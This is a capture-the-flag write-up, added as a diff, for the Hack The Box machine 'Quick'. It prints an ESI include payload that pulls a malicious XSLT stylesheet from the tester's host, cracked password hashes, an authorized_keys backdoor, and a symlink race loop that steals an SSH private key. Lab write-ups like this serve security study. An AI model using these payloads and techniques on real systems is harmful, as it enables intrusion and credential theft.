@@ -1,0 +1,177 @@
+[*] Domains: quick.htb, portal.quick.htb
+
+[*] dirbuster: 
+- /login.php
+- /db.php (interesting)
+- /search.php
+- /ticket.php
+
+[*] X-Powered-By: Esigate
+
+[*] 443/udp HTTPS is open. It's about QUIC transport protocol and HTTP/3.
+
+It's possible to use curl with HTTP/3 on MacOS: https://developers.cloudflare.com/http3/intro/curl-brew/
+
+Like that:
+limitedeternity$ curl --http3 https://portal.quick.htb
+
+[*] Extracted emails from https://portal.quick.htb/index.php?view=about:
+
+- jane@quick.htb
+- mike@quick.htb
+- john@quick.htb
+
+[*] Extracted QuickStart.pdf and Connectivity.pdf from docs/.
+
+[+] Got a password: Quick4cc3$$
+
+[-] Unable to log in with emails and password above.
+
+[+] Well, some wild guessing was required.
+
+There is "clients.php": http://10.10.10.186:9001/clients.php.
+And there are testimonals: http://10.10.10.186:9001/
+
+"QConsulting Pvt Ltd" -> "qconsulting.com" + UK -> "qconsulting.co.uk" + tim -> tim@qconsulting.co.uk
+"Darkwing Solutions" -> "dark-wing.co.za" + US -> "dark-wing.co.us" + roy -> roy@dark-wing.co.us
+"Wink" + UK -> "wink.co.uk" + elisa -> elisa@wink.co.uk
+
+And so on. So, logging in as elisa@wink.co.uk with password "Quick4cc3$$" worked.
+
+[*] There is a ticketing system. Remember "X-Powered-By" header? So: https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/
+
+We have to host a malicious XSLT payload, add it to a ticket's body and trigger its processing on ticket search.
+
+I'll submit this line as a ticket's body: 
+<esi:include src="http://10.10.10.186:9001/" stylesheet="http://10.10.14.29:8000/2.xsl">
+</esi:include>
+
+Ticket ID is TKT-1973.
+
+After that, I'll navigate there: 10.10.10.186:9001/search.php?search=TKT-1973
+
+And that will trigger command execution.
+
+[*] To get a reverse shell, I need two payloads. Two commands – two payloads.
+
+[+] Got user.txt!
+
+[*] Now, let's find that db.php.
+
+[+] /var/www/html/db.php:
+
+<?php
+$conn = new mysqli("localhost","db_adm","db_p4ss","quick");
+?>
+
+[*] Let's see, what's inside:
+
+sam@quick:/var/www/html$ mysql -h localhost -u db_adm -p
+Enter password: db_p4ss
+
+mysql> use quick;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> select * from users;
++--------------+------------------+----------------------------------+
+| name         | email            | password                         |
++--------------+------------------+----------------------------------+
+| Elisa        | elisa@wink.co.uk | c6c35ae1f3cb19438e0199cfa72a9d9d |
+| Server Admin | srvadm@quick.htb | e626d51f8fbfd1124fdea88396c35d05 |
++--------------+------------------+----------------------------------+
+2 rows in set (0.00 sec)
+
+[+] That's some progress. Now, we need to find an encryption function.
+
+sam@quick:/var/www/html$ cat login.php
+<...>
+$password = md5(crypt($password,'fa'));
+<...>
+
+[*] Let's crack the hash.
+
+root@parrot# php decrypt.php
+Password Found: yl51pbx
+
+[+] Nice! It's time for `su srvadm`.
+
+su: Authentication failure
+
+[-] ...what the f*
+
+[*] Okay, well, there should be another way to use this password.
+
+sam@quick:/var/www$ ll
+ll
+total 20
+drwxr-xr-x  5 root root 4096 Mar 21 03:07 ./
+drwxr-xr-x 14 root root 4096 Mar 20 02:10 ../
+drwxr-xr-x  2 root root 4096 Mar 20 03:48 html/
+drwxrwxrwx  2 root root 4096 Mar 21 03:11 jobs/
+drwxr-xr-x  6 root root 4096 Mar 21 03:08 printer/
+
+[*] I have some questions to ask Apache configuration.
+
+sam@quick:/var/www$ cat /etc/apache2/sites-available/000-default.conf 
+<VirtualHost *:80>
+	AssignUserId srvadm srvadm
+	ServerName printerv2.quick.htb
+	DocumentRoot /var/www/printer
+</VirtualHost>
+
+[*] New domain: printerv2.quick.htb. What's there?
+
+limitedeternity$ curl printerv2.quick.htb
+curl: (7) Failed to connect to printerv2.quick.htb port 80: Connection refused
+
+[-] I'm starting to feel some extra high levels of frustration.
+
+[*] Okay, let's forward that *:80 to our machine. We'll need SSH for that. Backdoor authorized_keys and proceed:
+
+limitedeternity$ ssh -L 9999:127.0.0.1:80 sam@quick.htb
+
+[*] Website will be available at http://printerv2.quick.htb:9999/ (after you associate localhost with printerv2.quick.htb in /etc/hosts).
+
+[+] Logged in. It's possible to add a printer there.
+
+[*] To be short:
+
+- /var/www/printer/job.php is owned by root
+- /var/www/printer/job.php creates a file with specified contents in /var/www/jobs to print it afterwards. 
+- /var/www/printer/job.php makes this file world-accessible (chmod 777).
+- /var/www/printer/job.php waits a bit.
+- /var/www/printer/job.php reads this file again and sends its contents to a printer (netcat listener will suffice).
+
+[*] There is a race condition possible + access rights misconfiguration. If we substitute the file, that job.php will create, by a symlink to /home/srvadm/.ssh/id_rsa, id_rsa will be read and sent to a printer (netcat listener). But we need to do it really quick.
+
+[*] I'll use the following script and sacrifice my reverse TCP shell for that:
+
+cd /var/www/jobs; while true; do for file in $(ls .); do rm -f $file; ln -s /home/srvadm/.ssh/id_rsa $file; done; done
+
+[*] At the same time, I'll submit a print job.
+
+[+] id_rsa retrieved!
+
+[+] SSH'd as srvadm.
+
+[+] srvadm@quick:~/.cache/conf.d$ cat printers.conf
+<...>
+DeviceURI https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer
+<...>
+
+> decodeURIComponent("https://srvadm%40quick.htb:%26ftQ4K3SGde8%3F@printerv3.quick.htb/printer")
+"https://srvadm@quick.htb:&ftQ4K3SGde8?@printerv3.quick.htb/printer"
+
+[*] If there is another printer...
+srvadm@quick:/etc/apache2$ grep "printerv3" -R .
+srvadm@quick:/etc/apache2$
+
+[*] Then, maybe, please?...
+srvadm@quick:/etc/apache2$ su root
+Password: 
+root@quick:/etc/apache2# 
+
+[+] Got root.txt!
+
